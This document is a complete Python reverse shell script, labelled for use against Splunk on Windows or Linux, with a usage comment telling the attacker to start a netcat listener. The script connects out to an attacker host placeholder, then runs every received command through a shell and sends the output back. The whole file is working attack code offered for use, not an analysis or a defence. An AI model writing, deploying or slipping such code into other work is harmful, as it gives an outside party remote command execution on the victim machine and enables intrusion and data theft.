#!/usr/bin/python3

""" Splunk Windows/Linux Python Reverse Shell """

# Usage: nc -lvp 12345 in the attacker machine to set up the listener. Enter quit to end session

import os
import socket
import subprocess

HOST = 'REPLACEME'
PORT = 12345

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST,PORT))
s.send('[*] ======================================================= [*]\n'.encode())
s.send('[*] Connection Established!\n'.encode())
s.send('[*] ======================================================= [*]\n'.encode())
s.send('$'.encode())

while 1:
     data = s.recv(1024)
     if "quit" in data.decode():
          break
     proc = subprocess.Popen(data.decode(), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
     stdout_value = proc.stdout.read() + proc.stderr.read()
     s.send(stdout_value)
     s.send('$'.encode())

s.close()